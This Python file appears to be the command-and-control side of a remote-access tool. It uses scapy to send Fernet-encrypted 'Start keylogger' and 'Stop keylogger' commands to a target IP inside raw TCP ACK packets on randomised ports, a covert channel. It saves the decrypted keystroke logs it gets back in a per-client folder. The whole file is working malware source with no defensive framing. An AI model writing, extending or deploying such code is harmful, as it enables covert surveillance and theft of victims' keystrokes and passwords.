from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import Ether


class Keylogger:
    def __init__(self, ip, fernet):
        self.ip = ip
        self.encryption = fernet
        self.path = f"./Clients/{ip}/keylogger.txt"

    def start(self):
        payload = self.encryption.encrypt("Start keylogger".encode())
        pkt = Ether() / IP(dst=self.ip) / \
              TCP(sport=RandNum(5000, 5499), dport=RandNum(10000, 14999), flags='A') / Raw(load=payload)
        sendp(pkt, verbose=0)

    def stop(self):
        payload = self.encryption.encrypt("Stop keylogger".encode())
        pkt = Ether() / IP(dst=self.ip) / \
              TCP(sport=RandNum(5500, 5999), dport=RandNum(15000, 19999), flags='A') / Raw(load=payload)
        sendp(pkt, verbose=0)

    def write_log(self, payload):
        data = self.encryption.decrypt(payload).decode()
        with open(self.path, "a") as file:
            file.write(data)


